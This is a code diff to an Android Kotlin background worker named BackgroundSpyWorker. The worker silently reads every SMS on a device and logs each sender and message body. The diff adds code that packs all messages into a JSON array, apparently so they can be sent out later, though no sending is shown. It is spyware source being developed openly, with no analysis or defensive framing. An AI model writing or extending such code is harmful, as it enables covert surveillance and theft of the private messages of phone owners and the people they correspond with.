@@ -6,6 +6,8 @@ import android.net.Uri
 import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
+import org.json.JSONObject
+import org.json.JSONArray
 
 
 class BackgroundSpyWorker(appContext: Context, workerParams: WorkerParameters)
@@ -28,11 +30,16 @@ class BackgroundSpyWorker(appContext: Context, workerParams: WorkerParameters)
         val cursor: Cursor? = context.contentResolver.query(SMS_URI, null, null, null, null)
         cursor?.use {
             if (cursor.moveToFirst()) {
+                val jsonArray = JSONArray()
                 do {
                     val sender: String = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                     val messageBody: String = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                    val jsonObject = JSONObject()
+                    jsonObject.put("sender", sender)
+                    jsonObject.put("messageBody", messageBody)
+                    jsonArray.put(jsonObject)
                     Log.d("SMS_DATA", "Sender: $sender, Message: $messageBody")
-
+                    Log.d("SMS_DATA", "Json: $jsonObject")
                 } while (cursor.moveToNext())
             }
         }
